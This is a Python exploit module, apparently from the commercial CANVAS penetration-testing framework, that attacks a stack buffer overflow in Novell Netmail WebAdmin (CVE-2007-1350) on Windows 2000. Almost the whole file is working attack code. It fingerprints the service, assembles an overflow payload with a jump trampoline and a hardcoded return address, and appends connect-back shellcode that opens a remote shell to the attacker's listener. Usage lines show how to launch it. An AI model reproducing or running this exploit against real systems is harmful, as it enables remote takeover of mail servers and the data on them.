#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Novell Netmail WebAdmin Overflow'
DESCRIPTION='Novell Netmail WebAdmin Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION['Date public']='03/07/07'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-009.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2007-1350"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1350"
DOCUMENTATION['CVSS'] = 6.8


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']

NOTES="""
The overflowed buffer (260 bytes before EIP) receives the following data:
\FOREST\TREE\username, meaning that the alignment will depend on the length
of the eDirectory forest and the eDirectory tree that are prepended to the
username. At the moment, we have not implemented a way to fetch those remotely
in the exploit, so you'll have to specify them by yourself.

Exiting the shell with a 'de 0' leaves the service available.

Tested on:
Novell Netmail 3.5.2 on Windows 2000 Server SP4 English
Novell Netmail 3.5.2e-FTF1 on Windows 2000 Server SP4 English

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/netmail_webadmin/netmail_webadmin.py -v 0 -t 10.10.11.136 -l 10.10.11.1 -d 5555 -O forest:IMMUNITYINC -O tree:CANVAS
"""

CHANGELOG="""
"""

import canvasengine
runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

targets={
    0:['Autodetect',0],
    1:['Novell Netmail WebAdmin 3.5.2 on Windows 2000',0x247533], #jmp ebx
    #1:['Novell Netmail WebAdmin 3.5.2 DoS',0x42424242],
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=89
        self.ssl=0
        self.badstring='\x00\r\n&=%+'
        self.searchcode=''
        self.forest='FOREST'
        self.tree='TREE'
        self.subesp=1000
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        self.shellcode=self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.ssl=self.argsDict.get('ssl',self.ssl)
        self.forest=self.argsDict.get('forest',self.forest)
        self.tree=self.argsDict.get('tree',self.tree)
        return 
    
    def test(self):
        self.getArgs()
        url='/'
        while True:
            s=self.gettcpsock()
            try:
                s.connect((self.host, self.port))
            except:
                self.log('Could not connect to port %s with ssl=%s'%(self.port,self.ssl))
                return 0
            request=''
            request+='GET '+url+' HTTP/1.1\r\n'
            request+='Host: %s:%d\r\n'%(self.host,self.port)
            request+='\r\n'
            self.websend(s,request)
            data=self.webrecv(s)
            s.close()
            if data.count('302 Moved')>0:
                index=data.find('"')
                url=data[index+1:]
                index=url.find('"')
                url=url[:index]
                #print url
            else:
                break
        if data.count('WebAdmin Login')>0:
            self.version=1
            return 1
        return 0
    
    def run(self):
        self.getArgs()

        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Autoversioning not available')
                return 0
        self.info,self.eip=targets[self.version]
        length=0x104-len(self.forest)-len(self.tree)-3 # \FOREST\TREE\username
        body=''
        body+='username='
        offset=len(body)
        from MOSDEF import mosdef
        trampoline="""
        addl $0x8,%ebp
        jmp %ebp
        """
        body+=mosdef.assemble(trampoline,'x86')
        body+='A'*(length-(len(body)-offset))
        body+=struct.pack('<L',self.eip)
        if body[-1]=='\0': #if last character is a NULL byte, strip it
            body=body[:-1]
        body+='&password=B&Logon=Logon'
        body+='&shellcode='+self.shellcode
        #print repr(self.shellcode)
        request=''
        request+='POST /f HTTP/1.1\r\n'
        request+='Host: %s:%d\r\n'%(self.host,self.port)
        request+='Content-Type: application/x-www-form-urlencoded\r\n'
        request+='Content-Length: %d\r\n'%(len(body))
        request+='\r\n'
        request+=body

        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        self.websend(s,request)
        time.sleep(12) #this one takes a while
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version [ -O ssl:1 ] -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
